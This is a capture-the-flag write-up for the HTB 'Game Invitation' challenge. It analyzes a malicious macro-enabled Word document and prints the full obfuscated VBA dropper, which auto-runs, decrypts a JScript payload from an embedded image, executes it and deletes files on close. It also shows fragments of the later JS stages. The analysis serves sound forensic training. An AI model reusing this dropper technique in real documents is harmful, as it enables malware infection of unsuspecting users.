# HTB Cyber Apocalypse 2024: Hacker Royale - Game Invitation

## Challenge

> In the bustling city of KORP™, where factions vie in The Fray, a mysterious game emerges. As a seasoned faction member, you feel the tension growing by the minute. Whispers spread of a new challenge, piquing both curiosity and wariness. Then, an email arrives: "Join The Fray: Embrace the Challenge." But lurking beneath the excitement is a nagging doubt. Could this invitation hide something more sinister within its innocent attachment?

## Metadata

- Difficulty: hard
- Creator: `thewildspirit`
- Files: [`invitation.docm`](files/invitation.docm)
- Docker: no
- Tags: `macro`, `vba`, `xor`, `jscript`
- Points: `300`
- Number of solvers: 

## Solution

### Initial analysis

We got a `.docm` file which is a macro enabled Word document.

Using the `olevba` tool, we can get the source code of the macro ([`macro.vb`](files/macro.vb)).

```vb
Public IAiiymixt As String
Public kWXlyKwVj As String


Function JFqcfEGnc(given_string() As Byte, length As Long) As Boolean
Dim xor_key As Byte
xor_key = 50
For i = 0 To length - 1
given_string(i) = given_string(i) Xor xor_key
xor_key = ((xor_key Xor 99) Xor (i Mod 254))
Next i
JFqcfEGnc = True
End Function

Sub AutoClose()
On Error Resume Next
Kill IAiiymixt
On Error Resume Next
Set aMUsvgOin = CreateObject("Scripting.FileSystemObject")
aMUsvgOin.DeleteFile kWXlyKwVj & "\*.*", True
Set aMUsvgOin = Nothing
End Sub

Sub AutoOpen()
On Error GoTo MnOWqnnpKXfRO
Dim chkDomain As String
Dim strUserDomain As String
chkDomain = "GAMEMASTERS.local"
strUserDomain = Environ$("UserDomain")
If chkDomain <> strUserDomain Then

Else

Dim gIvqmZwiW
Dim file_length As Long
Dim length As Long
file_length = FileLen(ActiveDocument.FullName)
gIvqmZwiW = FreeFile
Open (ActiveDocument.FullName) For Binary As #gIvqmZwiW
Dim CbkQJVeAG() As Byte
ReDim CbkQJVeAG(file_length)
Get #gIvqmZwiW, 1, CbkQJVeAG
Dim SwMbxtWpP As String
SwMbxtWpP = StrConv(CbkQJVeAG, vbUnicode)
Dim N34rtRBIU3yJO2cmMVu, I4j833DS5SFd34L3gwYQD
Dim vTxAnSEFH
    Set vTxAnSEFH = CreateObject("vbscript.regexp")
    vTxAnSEFH.Pattern = "sWcDWp36x5oIe2hJGnRy1iC92AcdQgO8RLioVZWlhCKJXHRSqO450AiqLZyLFeXYilCtorg0p3RdaoPa"
    Set I4j833DS5SFd34L3gwYQD = vTxAnSEFH.Execute(SwMbxtWpP)
Dim Y5t4Ul7o385qK4YDhr
If I4j833DS5SFd34L3gwYQD.Count = 0 Then
GoTo MnOWqnnpKXfRO
End If
For Each N34rtRBIU3yJO2cmMVu In I4j833DS5SFd34L3gwYQD
Y5t4Ul7o385qK4YDhr = N34rtRBIU3yJO2cmMVu.FirstIndex
Exit For
Next
Dim Wk4o3X7x1134j() As Byte
Dim KDXl18qY4rcT As Long
KDXl18qY4rcT = 13082
ReDim Wk4o3X7x1134j(KDXl18qY4rcT)
Get #gIvqmZwiW, Y5t4Ul7o385qK4YDhr + 81, Wk4o3X7x1134j
If Not JFqcfEGnc(Wk4o3X7x1134j(), KDXl18qY4rcT + 1) Then
GoTo MnOWqnnpKXfRO
End If
kWXlyKwVj = Environ("appdata") & "\Microsoft\Windows"
Set aMUsvgOin = CreateObject("Scripting.FileSystemObject")
If Not aMUsvgOin.FolderExists(kWXlyKwVj) Then
kWXlyKwVj = Environ("appdata")
End If
Set aMUsvgOin = Nothing
Dim K764B5Ph46Vh
K764B5Ph46Vh = FreeFile
IAiiymixt = kWXlyKwVj & "\" & "mailform.js"
Open (IAiiymixt) For Binary As #K764B5Ph46Vh
Put #K764B5Ph46Vh, 1, Wk4o3X7x1134j
Close #K764B5Ph46Vh
Erase Wk4o3X7x1134j
Set R66BpJMgxXBo2h = CreateObject("WScript.Shell")
R66BpJMgxXBo2h.Run """" + IAiiymixt + """" + " vF8rdgMHKBrvCoCp0ulm"
ActiveDocument.Save
Exit Sub
MnOWqnnpKXfRO:
Close #K764B5Ph46Vh
ActiveDocument.Save
End If
End Sub
```

If we clean up the macro we can figure out the following functionalities ([`macro-cleaned.vb`](files/macro-cleaned.vb)).

1. If we open the document the `AutoOpen()` subroutine will start
2. It check the domain of the machine (`GAMEMASTERS.local`)
3. It reads the bytes of the document (which is currently opened) into memory
4. Searches for a Base64-like string in the document (`sWcDWp36x5oIe2hJGnRy1iC92AcdQgO8RLioVZWlhCKJXHRSqO450AiqLZyLFeXYilCtorg0p3RdaoPa`)
5. It gets some part of the `docm` file
6. Reads 13082 bytes after the string is found
7. Decrypts the read bytes using XOR-based algorithm
8. Saves the result in the `%AppData%\Microsoft\Windows` folder as `mailfrom.js`
9. Executes the `mailfrom.js` file with an argument (`vF8rdgMHKBrvCoCp0ulm`)

### Decryption

If we search for the `sWcDWp36x5oIe2hJGnRy1iC92AcdQgO8RLioVZWlhCKJXHRSqO450AiqLZyLFeXYilCtorg0p3RdaoPa` string in the `docm` document, we can identify that the [`image1.jpg`](files/image1.jpg) in the document contains it around `0x0001d5e0`.

The macro basically gets the bytes of the image located after the random string, which is exactly `13082` bytes.

If we run the XOR decryption reimplemented in Python ([`solve.py`](files/solve.py)), it gives gibberish, not valid JavaScript code, but if we brute-force the first byte (`xor_key`) and at 45, we get a valid JS code ([`mailform.js`](files/mailform.js)).

### Second stage (`mailfrom.js`)

If we clean up the code a little bit ((`mailfrom-cleaned.js`)[files/mailfrom-cleaned.js]) At the beginning, the 5th statement is an `eval`.

```js
var lVky=WScript.Arguments;
var DASz=lVky(0);
var Iwlh=lyEK();
Iwlh=JrvS(Iwlh);
Iwlh=xR68(DASz,Iwlh);
eval(Iwlh);
```

We can execute the JS code until `eval` in a browser, we just need the argument from the macro: `vF8rdgMHKBrvCoCp0ulm`

### Third stage

The result is another JS code, which has the flag as Base64 in the `Cookie` header ([`final.js`](files/final.js))

```js
S47T.SETREQUESTHEADER("Cookie:","flag=SFRCe200bGQwY3NfNHIzX2czdHQxbmdfVHIxY2tpMTNyfQo=");
```

Flag: `HTB{m4ld0cs_4r3_g3tt1ng_Tr1cki13r}`